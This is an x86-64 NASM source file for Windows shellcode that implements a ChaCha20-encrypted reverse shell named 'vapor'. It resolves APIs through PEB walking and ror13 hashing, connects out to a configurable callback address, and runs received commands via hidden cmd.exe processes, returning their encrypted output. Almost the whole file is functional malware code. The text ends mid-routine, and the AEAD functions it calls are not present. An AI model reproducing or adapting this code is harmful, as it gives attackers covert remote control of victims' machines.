; ============================================================
; vapor.asm — ChaCha20-Poly1305 encrypted reverse shell
; x86_64 PIC shellcode for Windows
; ============================================================

BITS 64

%ifndef CALLBACK_IP
    %define CALLBACK_IP 0x0100007f     ; 127.0.0.1 (network byte order, LE stored)
%endif
%ifndef CALLBACK_PORT
    %define CALLBACK_PORT 0xbb01       ; 443 (network byte order, LE stored)
%endif

; ── Windows constants ──
%define AF_INET             2
%define SOCK_STREAM         1
%define IPPROTO_TCP         6
%define STARTF_USESTDHANDLES 0x100
%define CREATE_NO_WINDOW    0x08000000
%define ERROR_BROKEN_PIPE   109
%define INFINITE            0xFFFFFFFF

; ── API table offsets (index * 8 into api_table on stack) ──
%define API_LoadLibraryA         0
%define API_GetProcAddress       1
%define API_CreateProcessA       2
%define API_ReadFile             3
%define API_CreatePipe           4
%define API_CloseHandle          5
%define API_ExitProcess          6
%define API_WaitForSingleObject  7
%define API_GetLastError         8
%define API_WSAStartup           9
%define API_WSASocketA           10
%define API_connect              11
%define API_recv                 12
%define API_send                 13
%define API_SystemFunction036    14
%define API_TerminateProcess     15
%define API_PeekNamedPipe        16
%define API_COUNT                17

; ── ror13 hashes (precomputed) ──
; kernel32.dll
%define H_LoadLibraryA        0xec0e4e8e
%define H_GetProcAddress      0x7c0dfcaa
%define H_CreateProcessA      0x16b3fe72
%define H_ReadFile            0x10fa6516
%define H_CreatePipe          0x170c8f80
%define H_CloseHandle         0x0ffd97fb
%define H_ExitProcess         0x73e2d87e
%define H_WaitForSingleObject 0xce05d9ad
%define H_GetLastError        0x75da1966
%define H_TerminateProcess    0x78b5b983
%define H_PeekNamedPipe       0xb407c411

; ws2_32.dll
%define H_WSAStartup          0x3bfcedcb
%define H_WSASocketA          0xadf509d9
%define H_connect             0x60aaf9ec
%define H_recv                0xe71819b6
%define H_send                0xe97019a4

; advapi32.dll
%define H_SystemFunction036   0xa8a1833c

; ============================================================
; _start — entry point
; ============================================================
global _start
section .text

_start:
    ; Save original stack pointer and align
    mov     rbp, rsp
    and     rsp, -16

    ; Allocate space:
    ;   API table:        17 * 8 = 136 bytes
    ;   WSADATA:          408 bytes
    ;   sockaddr_in:      16 bytes
    ;   work buffers:     allocated later as needed
    ; Total initial:      ~568 bytes, round up to 1024
    sub     rsp, 1024

    ; RSP+0    = api_table[0..16]  (136 bytes)
    ; RSP+136  = WSADATA           (408 bytes)
    ; RSP+544  = sockaddr_in       (16 bytes)
    ; RSP+560  = scratch space

    lea     r15, [rsp]          ; r15 = base of api_table

    ; ── Resolve kernel32.dll APIs ──
    call    find_kernel32
    mov     r14, rax            ; r14 = kernel32 base

    ; Resolve each kernel32 function
    mov     rcx, r14
    mov     edx, H_LoadLibraryA
    call    resolve_hash
    mov     [r15 + API_LoadLibraryA * 8], rax

    mov     rcx, r14
    mov     edx, H_GetProcAddress
    call    resolve_hash
    mov     [r15 + API_GetProcAddress * 8], rax

    mov     rcx, r14
    mov     edx, H_CreateProcessA
    call    resolve_hash
    mov     [r15 + API_CreateProcessA * 8], rax

    mov     rcx, r14
    mov     edx, H_ReadFile
    call    resolve_hash
    mov     [r15 + API_ReadFile * 8], rax

    mov     rcx, r14
    mov     edx, H_CreatePipe
    call    resolve_hash
    mov     [r15 + API_CreatePipe * 8], rax

    mov     rcx, r14
    mov     edx, H_CloseHandle
    call    resolve_hash
    mov     [r15 + API_CloseHandle * 8], rax

    mov     rcx, r14
    mov     edx, H_ExitProcess
    call    resolve_hash
    mov     [r15 + API_ExitProcess * 8], rax

    mov     rcx, r14
    mov     edx, H_WaitForSingleObject
    call    resolve_hash
    mov     [r15 + API_WaitForSingleObject * 8], rax

    mov     rcx, r14
    mov     edx, H_GetLastError
    call    resolve_hash
    mov     [r15 + API_GetLastError * 8], rax

    mov     rcx, r14
    mov     edx, H_TerminateProcess
    call    resolve_hash
    mov     [r15 + API_TerminateProcess * 8], rax

    mov     rcx, r14
    mov     edx, H_PeekNamedPipe
    call    resolve_hash
    mov     [r15 + API_PeekNamedPipe * 8], rax

    ; ── Load ws2_32.dll ──
    call    .get_ws2_str
    db      'ws2_32.dll', 0
.get_ws2_str:
    pop     rcx                 ; rcx = "ws2_32.dll"
    sub     rsp, 32             ; shadow space
    call    [r15 + API_LoadLibraryA * 8]
    add     rsp, 32
    mov     r14, rax            ; r14 = ws2_32 base

    ; Resolve ws2_32 functions
    mov     rcx, r14
    mov     edx, H_WSAStartup
    call    resolve_hash
    mov     [r15 + API_WSAStartup * 8], rax

    mov     rcx, r14
    mov     edx, H_WSASocketA
    call    resolve_hash
    mov     [r15 + API_WSASocketA * 8], rax

    mov     rcx, r14
    mov     edx, H_connect
    call    resolve_hash
    mov     [r15 + API_connect * 8], rax

    mov     rcx, r14
    mov     edx, H_recv
    call    resolve_hash
    mov     [r15 + API_recv * 8], rax

    mov     rcx, r14
    mov     edx, H_send
    call    resolve_hash
    mov     [r15 + API_send * 8], rax

    ; ── Load advapi32.dll ──
    call    .get_adv_str
    db      'advapi32.dll', 0
.get_adv_str:
    pop     rcx                 ; rcx = "advapi32.dll"
    sub     rsp, 32
    call    [r15 + API_LoadLibraryA * 8]
    add     rsp, 32
    mov     r14, rax            ; r14 = advapi32 base

    ; Resolve SystemFunction036 (RtlGenRandom) via GetProcAddress
    ; (forwarded export — resolve_hash can't follow forwarders)
    mov     rcx, r14                ; advapi32 base
    call    .get_sf036_str
    db      'SystemFunction036', 0
.get_sf036_str:
    pop     rdx                     ; rdx = "SystemFunction036"
    sub     rsp, 32
    call    [r15 + API_GetProcAddress * 8]
    add     rsp, 32
    mov     [r15 + API_SystemFunction036 * 8], rax

    ; ── WSAStartup ──
    lea     rdx, [r15 + 136]    ; rdx = &WSADATA
    mov     ecx, 0x0202         ; wVersionRequired = 2.2
    sub     rsp, 32
    call    [r15 + API_WSAStartup * 8]
    add     rsp, 32
    test    eax, eax
    jnz     .exit_wsa_fail

    ; ── WSASocketA ──
    mov     ecx, AF_INET        ; af
    mov     edx, SOCK_STREAM    ; type
    mov     r8d, IPPROTO_TCP    ; protocol
    xor     r9d, r9d            ; lpProtocolInfo = NULL
    sub     rsp, 48             ; shadow + 2 stack args
    mov     qword [rsp+32], 0   ; g = 0
    mov     qword [rsp+40], 0   ; dwFlags = 0
    call    [r15 + API_WSASocketA * 8]
    add     rsp, 48
    cmp     rax, -1
    je      .exit_sock_fail
    mov     r13, rax            ; r13 = socket handle

    ; ── Build sockaddr_in and connect ──
    lea     rdx, [r15 + 544]    ; rdx = &sockaddr_in
    mov     word [rdx], AF_INET
    mov     word [rdx+2], CALLBACK_PORT
    mov     dword [rdx+4], CALLBACK_IP
    mov     qword [rdx+8], 0    ; zero padding

    mov     rcx, r13            ; socket
    ; rdx already points to sockaddr_in
    mov     r8d, 16             ; namelen
    sub     rsp, 32
    call    [r15 + API_connect * 8]
    add     rsp, 32
    test    eax, eax
    jnz     .exit_conn_fail

    ; ── Connected! Enter main command loop ──
    jmp     main_loop

.exit_wsa_fail:
    mov     ecx, 2              ; WSAStartup failed
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]

.exit_sock_fail:
    mov     ecx, 3              ; WSASocketA failed
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]

.exit_conn_fail:
    mov     ecx, 4              ; connect failed
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]

.exit_fail:
    mov     ecx, 1
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]

.exit_ok:
    xor     ecx, ecx
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]


; ============================================================
; find_kernel32 — walk PEB to find kernel32.dll base
; Returns: RAX = kernel32 base address
; ============================================================
find_kernel32:
    ; PEB is at gs:[0x60] on x64
    mov     rax, [gs:0x60]      ; PEB
    mov     rax, [rax+0x18]     ; PEB_LDR_DATA
    mov     rsi, [rax+0x20]     ; InMemoryOrderModuleList.Flink

.next_mod:
    mov     rax, [rsi+0x20]     ; DllBase
    mov     rdi, [rsi+0x50]     ; BaseDllName.Buffer (UNICODE_STRING)
    movzx   ecx, word [rsi+0x48] ; BaseDllName.Length
    test    rax, rax
    jz      .next_link

    ; Hash the module name (case-insensitive)
    ; Check if this is kernel32.dll by comparing against known hash
    push    rax
    push    rsi
    xor     edx, edx
    shr     ecx, 1              ; length in chars (UNICODE = 2 bytes per char)
.hash_mod_name:
    test    ecx, ecx
    jz      .check_mod_hash
    movzx   eax, word [rdi]
    ; Lowercase
    cmp     al, 'A'
    jb      .no_lower
    cmp     al, 'Z'
    ja      .no_lower
    or      al, 0x20
.no_lower:
    ror     edx, 13
    add     edx, eax
    add     rdi, 2
    dec     ecx
    jmp     .hash_mod_name
.check_mod_hash:
    cmp     edx, 0x8fecd63f     ; ror13 hash of "kernel32.dll"
    pop     rsi
    pop     rax
    je      .found_kernel32

.next_link:
    mov     rsi, [rsi]          ; Flink
    jmp     .next_mod

.found_kernel32:
    ret


; ============================================================
; resolve_hash — find export by ror13 hash
; Input:  RCX = module base, EDX = target hash
; Returns: RAX = function address
; ============================================================
resolve_hash:
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13

    mov     r12, rcx            ; module base
    mov     r13d, edx           ; target hash

    ; Parse PE headers
    mov     eax, [r12+0x3c]     ; e_lfanew
    lea     rax, [r12+rax]      ; NT headers
    ; Export directory RVA is at offset 0x88 in NT headers (64-bit)
    mov     eax, [rax+0x88]     ; Export directory RVA
    test    eax, eax
    jz      .resolve_fail
    lea     rbx, [r12+rax]      ; Export directory

    mov     ecx, [rbx+0x18]     ; NumberOfNames
    mov     eax, [rbx+0x20]     ; AddressOfNames RVA
    lea     rsi, [r12+rax]      ; AddressOfNames

.search_exports:
    test    ecx, ecx
    jz      .resolve_fail
    dec     ecx

    ; Get name RVA
    mov     eax, [rsi+rcx*4]
    lea     rdi, [r12+rax]      ; function name string

    ; Hash the function name
    xor     edx, edx
.hash_fn_name:
    movzx   eax, byte [rdi]
    test    al, al
    jz      .compare_hash
    ror     edx, 13
    add     edx, eax
    inc     rdi
    jmp     .hash_fn_name

.compare_hash:
    cmp     edx, r13d
    jnz     .search_exports

    ; Found! Get ordinal and address
    mov     eax, [rbx+0x24]     ; AddressOfNameOrdinals RVA
    lea     rdi, [r12+rax]
    movzx   eax, word [rdi+rcx*2] ; ordinal

    mov     edi, [rbx+0x1c]     ; AddressOfFunctions RVA
    lea     rdi, [r12+rdi]
    mov     eax, [rdi+rax*4]    ; function RVA
    lea     rax, [r12+rax]      ; function address

    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.resolve_fail:
    xor     eax, eax
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret


; ============================================================
; main_loop — recv command, execute, send result
; r15 = api_table, r13 = socket handle
; ============================================================
main_loop:
    ; Allocate large working buffer for command loop
    ;   recv buffer:    8192 bytes  (max command input)
    ;   output buffer:  65536 bytes (max command output)
    ;   crypto buffer:  65600 bytes (output + nonce + mac + length)
    ;   cmd string:     8256 bytes  ("cmd.exe /c " + command)
    ;   STARTUPINFO:    104 bytes
    ;   PROCESS_INFO:   24 bytes
    ;   pipe handles:   16 bytes
    ;   SECURITY_ATTRS: 24 bytes
    ;   misc:           padding
    ; Total: ~148000, round to 152064 (37 * 4096, 16-aligned)
    ; Probe stack pages (4KB each) to trigger guard pages
    mov     ecx, 37             ; 37 pages * 4096 = 151552
.probe_stack:
    sub     rsp, 4096
    mov     byte [rsp], 0       ; touch page to trigger guard
    dec     ecx
    jnz     .probe_stack
    ; RSP is now 151552 bytes lower; subtract remaining for 152064
    sub     rsp, 512            ; 151552 + 512 = 152064

    ; r12 = base of working area
    lea     r12, [rsp + 32]     ; leave shadow space at bottom

    ; Offsets into working area
    ; +0:       recv_buf (8192)
    ; +8192:    output_buf (65536)
    ; +73728:   crypto_buf (65600)
    ; +139328:  cmd_str (8256)
    ; +147584:  STARTUPINFO (104)
    ; +147688:  PROCESS_INFORMATION (24)
    ; +147712:  pipe handles (16: hRead, hWrite)
    ; +147728:  SECURITY_ATTRIBUTES (24)
    ; +147752:  misc (bytesRead, etc.)

.cmd_loop:
    ; ── Receive encrypted command ──
    ; First recv 4-byte length prefix
    lea     rdx, [r12 + 139328] ; temp: use cmd_str area for length
    mov     rcx, r13            ; socket
    mov     r8d, 4              ; 4 bytes
    call    recv_exact
    test    eax, eax
    jnz     .loop_exit

    ; Read length value
    mov     eax, [r12 + 139328]
    cmp     eax, 65600          ; sanity check
    ja      .loop_exit
    mov     ebx, eax            ; ebx = payload length

    ; Recv payload into crypto_buf
    lea     rdx, [r12 + 73728]  ; crypto_buf
    mov     rcx, r13            ; socket
    mov     r8d, ebx            ; length
    call    recv_exact
    test    eax, eax
    jnz     .loop_exit

    ; ── Decrypt ──
    ; payload = [nonce(12)][ciphertext][mac(16)]
    ; Nonce is first 12 bytes
    lea     rcx, [r12 + 73728]  ; nonce ptr
    lea     rdx, [r12 + 73728 + 12] ; ct+mac ptr
    mov     r8d, ebx
    sub     r8d, 12             ; ct+mac length
    lea     r9, [r12]           ; output -> recv_buf
    call    aead_decrypt
    cmp     eax, -1
    je      .cmd_loop           ; MAC fail, discard and loop

    ; eax = plaintext length
    mov     ebx, eax

    ; Null-terminate the command
    mov     byte [r12 + rbx], 0

    ; ── Check for EXIT ──
    cmp     ebx, 4
    jne     .not_exit
    cmp     dword [r12], 'EXIT'
    je      .loop_exit_ok
.not_exit:
    ; ── Execute command ──
    ; Build "cmd.exe /c <command>"
    lea     rdi, [r12 + 139328] ; cmd_str
    call    .get_cmd_prefix
    db      'cmd.exe /c ', 0
.get_cmd_prefix:
    pop     rsi
    ; Copy prefix
    xor     ecx, ecx
.copy_prefix:
    mov     al, [rsi + rcx]
    mov     [rdi + rcx], al
    test    al, al
    jz      .copy_cmd
    inc     ecx
    jmp     .copy_prefix
.copy_cmd:
    ; Copy command after prefix
    lea     rsi, [r12]          ; recv_buf (decrypted command)
    xor     edx, edx
.copy_cmd_loop:
    cmp     edx, ebx
    jge     .copy_cmd_done
    mov     al, [rsi + rdx]
    mov     [rdi + rcx], al
    inc     ecx
    inc     edx
    jmp     .copy_cmd_loop
.copy_cmd_done:
    mov     byte [rdi + rcx], 0 ; null terminate

    ; ── CreatePipe ──
    ; SECURITY_ATTRIBUTES
    lea     rax, [r12 + 147728]
    mov     dword [rax], 24     ; nLength
    mov     qword [rax+8], 0    ; lpSecurityDescriptor
    mov     dword [rax+16], 1   ; bInheritHandle = TRUE

    lea     rcx, [r12 + 147712]     ; &hReadPipe
    lea     rdx, [r12 + 147712 + 8] ; &hWritePipe
    lea     r8, [r12 + 147728]      ; &sa
    mov     r9d, 65536              ; nSize = 64KB (prevent pipe deadlock)
    sub     rsp, 32
    call    [r15 + API_CreatePipe * 8]
    add     rsp, 32
    test    eax, eax
    jz      .send_empty

    ; ── Setup STARTUPINFO ──
    lea     rax, [r12 + 147584]
    ; Zero it out
    push    rdi
    lea     rdi, [r12 + 147584]
    xor     ecx, ecx
    mov     al, 0
    mov     ecx, 104
    rep     stosb
    pop     rdi

    lea     rax, [r12 + 147584]
    mov     dword [rax], 104            ; cb
    mov     dword [rax+60], STARTF_USESTDHANDLES ; dwFlags
    mov     rcx, [r12 + 147712 + 8]    ; hWritePipe
    ; hStdInput left as 0 (zeroed by rep stosb above)
    mov     [rax+88], rcx              ; hStdOutput = hWritePipe
    mov     [rax+96], rcx              ; hStdError = hWritePipe

    ; ── CreateProcessA ──
    xor     ecx, ecx                   ; lpApplicationName = NULL
    lea     rdx, [r12 + 139328]        ; lpCommandLine
    xor     r8d, r8d                   ; lpProcessAttributes = NULL
    xor     r9d, r9d                   ; lpThreadAttributes = NULL
    sub     rsp, 80                    ; shadow + 6 stack args
    mov     dword [rsp+32], 1          ; bInheritHandles = TRUE
    mov     dword [rsp+40], CREATE_NO_WINDOW ; dwCreationFlags
    mov     qword [rsp+48], 0          ; lpEnvironment = NULL
    mov     qword [rsp+56], 0          ; lpCurrentDirectory = NULL
    lea     rax, [r12 + 147584]
    mov     [rsp+64], rax              ; lpStartupInfo
    lea     rax, [r12 + 147688]
    mov     [rsp+72], rax              ; lpProcessInformation
    call    [r15 + API_CreateProcessA * 8]
    add     rsp, 80
    test    eax, eax
    jz      .close_pipes_send_empty

    ; ── Close write end of pipe in parent ──
    mov     rcx, [r12 + 147712 + 8]    ; hWritePipe
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32

    ; ── Poll loop: read pipe while waiting for process (30s timeout) ──
    xor     ebx, ebx                   ; total bytes read
    mov     edi, 300                   ; 300 * 100ms = 30s timeout

.poll_loop:
    ; WaitForSingleObject(hProcess, 100ms)
    mov     rcx, [r12 + 147688]        ; hProcess
    mov     edx, 100                   ; 100ms
    sub     rsp, 32
    call    [r15 + API_WaitForSingleObject * 8]
    add     rsp, 32
    test    eax, eax
    jz      .process_exited            ; WAIT_OBJECT_0 = process done

    ; PeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytesAvail, NULL)
    mov     rcx, [r12 + 147712]        ; hReadPipe
    xor     edx, edx                   ; lpBuffer = NULL
    xor     r8d, r8d                   ; nBufferSize = 0
    xor     r9d, r9d                   ; lpBytesRead = NULL
    sub     rsp, 48
    lea     rax, [r12 + 147752]
    mov     [rsp+32], rax              ; &bytesAvail
    mov     qword [rsp+40], 0          ; lpBytesLeftThisMessage = NULL
    call    [r15 + API_PeekNamedPipe * 8]
    add     rsp, 48
    test    eax, eax
    jz      .poll_next                 ; PeekNamedPipe failed

    mov     eax, [r12 + 147752]        ; bytesAvail
    test    eax, eax
    jz      .poll_next                 ; no data available

    ; Read available data (capped at remaining buffer space)
    mov     r8d, 65536
    sub     r8d, ebx
    jle     .poll_next                 ; buffer full
    cmp     eax, r8d
    cmova   eax, r8d                   ; min(avail, remaining)
    mov     r8d, eax

    lea     rdx, [r12 + 8192 + rbx]   ; output_buf + offset
    mov     rcx, [r12 + 147712]        ; hReadPipe
    lea     r9, [r12 + 147752]         ; &bytesRead
    sub     rsp, 48
    mov     qword [rsp+32], 0          ; lpOverlapped = NULL
    call    [r15 + API_ReadFile * 8]
    add     rsp, 48
    test    eax, eax
    jz      .poll_next
    add     ebx, [r12 + 147752]        ; add bytesRead

.poll_next:
    dec     edi
    jnz     .poll_loop

    ; Timeout — terminate and send whatever we collected
    mov     rcx, [r12 + 147688]        ; hProcess
    mov     edx, 1                     ; exit code
    sub     rsp, 32
    call    [r15 + API_TerminateProcess * 8]
    add     rsp, 32
    jmp     .read_done

.process_exited:
    ; Process done — drain any remaining data from pipe
.drain_loop:
    mov     r8d, 65536
    sub     r8d, ebx
    jle     .read_done                 ; buffer full
    lea     rdx, [r12 + 8192 + rbx]   ; output_buf + offset
    mov     rcx, [r12 + 147712]        ; hReadPipe
    lea     r9, [r12 + 147752]         ; &bytesRead
    sub     rsp, 48
    mov     qword [rsp+32], 0          ; lpOverlapped = NULL
    call    [r15 + API_ReadFile * 8]
    add     rsp, 48
    test    eax, eax
    jz      .read_done                 ; ERROR_BROKEN_PIPE = all data read
    add     ebx, [r12 + 147752]        ; add bytesRead
    jmp     .drain_loop

.read_done:
    ; Close remaining handles
    mov     rcx, [r12 + 147712]        ; hReadPipe
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32

    mov     rcx, [r12 + 147688]        ; hProcess
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32

    mov     rcx, [r12 + 147688 + 8]    ; hThread
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32

    ; ── Encrypt and send output ──
    ; ebx = output length
    jmp     .send_output

.close_pipes_send_empty:
    ; CreateProcess failed, close pipes
    mov     rcx, [r12 + 147712]
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32
    mov     rcx, [r12 + 147712 + 8]
    sub     rsp, 32
    call    [r15 + API_CloseHandle * 8]
    add     rsp, 32

.send_empty:
    xor     ebx, ebx            ; 0 bytes output

.send_output:
    ; Generate 12-byte nonce via SystemFunction036 (RtlGenRandom)
    mov     rax, [r15 + API_SystemFunction036 * 8]
    test    rax, rax
    jz      .sf036_null
    lea     rcx, [r12 + 73728]
    mov     edx, 12
    sub     rsp, 32
    call    rax
    add     rsp, 32
    jmp     .sf036_done
.sf036_null:
    ; Function not found — use zeroed nonce fallback
    lea     rax, [r12 + 73728]
    mov     qword [rax], 0
    mov     dword [rax+8], 0
.sf036_done:

    ; aead_encrypt(output_buf, output_len, nonce, crypto_buf+12)
    lea     rcx, [r12 + 73728]      ; nonce ptr (12 bytes)
    lea     rdx, [r12 + 8192]       ; plaintext (output_buf)
    mov     r8d, ebx                ; plaintext length
    lea     r9, [r12 + 73728 + 12]  ; output: ct+mac after nonce
    call    aead_encrypt
    ; eax = ct+mac length

    ; Total frame: nonce(12) + ct + mac(16)
    add     eax, 12
    mov     ebx, eax

    ; Send length prefix
    lea     rax, [r12 + 139328]     ; temp area
    mov     [rax], ebx              ; store length as LE dword
    mov     rcx, r13                ; socket
    lea     rdx, [r12 + 139328]     ; &length
    mov     r8d, 4
    call    send_all
    test    eax, eax
    jnz     .loop_exit

    ; Send encrypted payload (nonce + ct + mac)
    mov     rcx, r13                ; socket
    lea     rdx, [r12 + 73728]     ; crypto_buf (nonce+ct+mac)
    mov     r8d, ebx
    call    send_all
    test    eax, eax
    jnz     .loop_exit

    jmp     .cmd_loop

.loop_exit:
    mov     ecx, 1
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]

.loop_exit_ok:
    xor     ecx, ecx
    sub     rsp, 32
    call    [r15 + API_ExitProcess * 8]


; ============================================================
; recv_exact — loop recv until n bytes received
; RCX = socket, RDX = buffer, R8D = count
; Returns: EAX = 0 on success, -1 on failure
; ============================================================
recv_exact:
    push    rbx
    push    rsi
    push    rdi
    mov     rbx, rcx            ; socket
    mov     rsi, rdx            ; buffer
    mov     edi, r8d            ; remaining

.recv_loop:
    test    edi, edi
    jle     .recv_ok

    mov     rcx, rbx            ; socket
    mov     rdx, rsi            ; buffer + offset
    mov     r8d, edi            ; remaining
    xor     r9d, r9d            ; flags = 0
    sub     rsp, 32
    call    [r15 + API_recv * 8]
    add     rsp, 32

    cmp     eax, 0
    jle     .recv_fail          ; 0 = closed, <0 = error

    add     rsi, rax
    sub     edi, eax
    jmp     .recv_loop

.recv_ok:
    xor     eax, eax
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.recv_fail:
    mov     eax, -1
    pop     rdi
    pop     rsi
    pop     rbx
    ret


; ============================================================
; send_all — loop send until all bytes sent
; RCX = socket, RDX = buffer, R8D = count
; Returns: EAX = 0 on success, -1 on failure
; ============================================================
send_all:
    push    rbx
    push    rsi
    push    rdi
    mov     rbx, rcx
    mov     rsi, rdx
    mov     edi, r8d

.send_loop:
    test    edi, edi
    jle     .send_ok

    mov     rcx, rbx
    mov     rdx, rsi
    mov     r8d, edi
    xor     r9d, r9d            ; flags = 0
    sub     rsp, 32
    call    [r15 + API_send * 8]
    add     rsp, 32

    cmp     eax, 0
    jle     .send_fail

    add     rsi, rax
    sub     edi, eax
    jmp     .send_loop

.send_ok:
    xor     eax, eax
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.send_fail:
    mov     eax, -1
    pop     rdi
    pop     rsi
    pop     rbx
    ret


; ============================================================
; ChaCha20 implementation
; ============================================================

; chacha20_block — generate one 64-byte keystream block
; RCX = key ptr (32 bytes)
; RDX = nonce ptr (12 bytes)
; R8D = counter
; R9  = output ptr (64 bytes)
chacha20_block:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 192            ; 64 state + 64 working + 64 scratch
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14

    mov     r12, rcx            ; key
    mov     r13, rdx            ; nonce
    mov     r14, r9             ; output

    lea     rsi, [rbp - 128]    ; state (original)
    lea     rdi, [rbp - 64]     ; working copy

    ; Initialize state
    ; "expand 32-byte k"
    mov     dword [rsi+0],  0x61707865
    mov     dword [rsi+4],  0x3320646e
    mov     dword [rsi+8],  0x79622d32
    mov     dword [rsi+12], 0x6b206574

    ; Key (8 dwords)
    mov     eax, [r12+0]
    mov     [rsi+16], eax
    mov     eax, [r12+4]
    mov     [rsi+20], eax
    mov     eax, [r12+8]
    mov     [rsi+24], eax
    mov     eax, [r12+12]
    mov     [rsi+28], eax
    mov     eax, [r12+16]
    mov     [rsi+32], eax
    mov     eax, [r12+20]
    mov     [rsi+36], eax
    mov     eax, [r12+24]
    mov     [rsi+40], eax
    mov     eax, [r12+28]
    mov     [rsi+44], eax

    ; Counter
    mov     [rsi+48], r8d

    ; Nonce (3 dwords)
    mov     eax, [r13+0]
    mov     [rsi+52], eax
    mov     eax, [r13+4]
    mov     [rsi+56], eax
    mov     eax, [r13+8]
    mov     [rsi+60], eax

    ; Copy state to working copy
    mov     ecx, 16
.copy_state:
    dec     ecx
    mov     eax, [rsi + rcx*4]
    mov     [rdi + rcx*4], eax
    test    ecx, ecx
    jnz     .copy_state

    ; 10 double-rounds (20 rounds total)
    mov     ecx, 10
.double_round:
    push    rcx

    ; Column rounds
    ; QR(0, 4, 8, 12)
    mov     eax, [rdi+0]
    mov     ebx, [rdi+16]
    mov     ecx, [rdi+32]
    mov     edx, [rdi+48]
    call    quarter_round
    mov     [rdi+0], eax
    mov     [rdi+16], ebx
    mov     [rdi+32], ecx
    mov     [rdi+48], edx

    ; QR(1, 5, 9, 13)
    mov     eax, [rdi+4]
    mov     ebx, [rdi+20]
    mov     ecx, [rdi+36]
    mov     edx, [rdi+52]
    call    quarter_round
    mov     [rdi+4], eax
    mov     [rdi+20], ebx
    mov     [rdi+36], ecx
    mov     [rdi+52], edx

    ; QR(2, 6, 10, 14)
    mov     eax, [rdi+8]
    mov     ebx, [rdi+24]
    mov     ecx, [rdi+40]
    mov     edx, [rdi+56]
    call    quarter_round
    mov     [rdi+8], eax
    mov     [rdi+24], ebx
    mov     [rdi+40], ecx
    mov     [rdi+56], edx

    ; QR(3, 7, 11, 15)
    mov     eax, [rdi+12]
    mov     ebx, [rdi+28]
    mov     ecx, [rdi+44]
    mov     edx, [rdi+60]
    call    quarter_round
    mov     [rdi+12], eax
    mov     [rdi+28], ebx
    mov     [rdi+44], ecx
    mov     [rdi+60], edx

    ; Diagonal rounds
    ; QR(0, 5, 10, 15)
    mov     eax, [rdi+0]
    mov     ebx, [rdi+20]
    mov     ecx, [rdi+40]
    mov     edx, [rdi+60]
    call    quarter_round
    mov     [rdi+0], eax
    mov     [rdi+20], ebx
    mov     [rdi+40], ecx
    mov     [rdi+60], edx

    ; QR(1, 6, 11, 12)
    mov     eax, [rdi+4]
    mov     ebx, [rdi+24]
    mov     ecx, [rdi+44]
    mov     edx, [rdi+48]
    call    quarter_round
    mov     [rdi+4], eax
    mov     [rdi+24], ebx
    mov     [rdi+44], ecx
    mov     [rdi+48], edx

    ; QR(2, 7, 8, 13)
    mov     eax, [rdi+8]
    mov     ebx, [rdi+28]
    mov     ecx, [rdi+32]
    mov     edx, [rdi+52]
    call    quarter_round
    mov     [rdi+8], eax
    mov     [rdi+28], ebx
    mov     [rdi+32], ecx
    mov     [rdi+52], edx

    ; QR(3, 4, 9, 14)
    mov     eax, [rdi+12]
    mov     ebx, [rdi+16]
    mov     ecx, [rdi+36]
    mov     edx, [rdi+56]
    call    quarter_round
    mov     [rdi+12], eax
    mov     [rdi+16], ebx
    mov     [rdi+36], ecx
    mov     [rdi+56], edx

    pop     rcx
    dec     ecx
    jnz     .double_round

    ; Add original state to working copy
    mov     ecx, 16
.add_state:
    dec     ecx
    mov     eax, [rsi + rcx*4]
    add     [rdi + rcx*4], eax
    test    ecx, ecx
    jnz     .add_state

    ; Copy working copy to output
    mov     ecx, 16
.copy_output:
    dec     ecx
    mov     eax, [rdi + rcx*4]
    mov     [r14 + rcx*4], eax
    test    ecx, ecx
    jnz     .copy_output

    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    leave
    ret


; quarter_round — ChaCha20 quarter round
; EAX=a, EBX=b, ECX=c, EDX=d
; Returns modified values in same registers
quarter_round:
    add     eax, ebx
    xor     edx, eax
    rol     edx, 16
    add     ecx, edx
    xor     ebx, ecx
    rol     ebx, 12
    add     eax, ebx
    xor     edx, eax
    rol     edx, 8
    add     ecx, edx
    xor     ebx, ecx
    rol     ebx, 7
    ret


; chacha20_encrypt — XOR plaintext with keystream
; RCX = key ptr (32 bytes)
; RDX = nonce ptr (12 bytes)
; R8  = data ptr (encrypted in-place)
; R9D = data length
; [rsp+40] = initial counter (after shadow space)
chacha20_encrypt:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 104            ; 64 keystream block + shadow + 8 alignment pad
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15

    mov     r12, rcx            ; key
    mov     r13, rdx            ; nonce
    mov     r14, r8             ; data
    mov     r15d, r9d           ; length
    mov     ebx, [rbp+48]      ; initial counter (from stack arg)

.encrypt_block:
    test    r15d, r15d
    jle     .encrypt_done

    ; Generate keystream block
    mov     rcx, r12            ; key
    mov     rdx, r13            ; nonce
    mov     r8d, ebx            ; counter
    lea     r9, [rbp - 64]     ; keystream output
    call    chacha20_block

    ; XOR keystream with data
    mov     ecx, 64
    cmp     ecx, r15d
    cmovg   ecx, r15d          ; min(64, remaining)
    xor     esi, esi
.xor_loop:
    cmp     esi, ecx
    jge     .xor_done
    mov     al, [rbp - 64 + rsi]
    xor     [r14 + rsi], al
    inc     esi
    jmp     .xor_loop
.xor_done:
    add     r14, 64
    sub     r15d, 64
    inc     ebx
    jmp     .encrypt_block

.encrypt_done:
    pop     r15
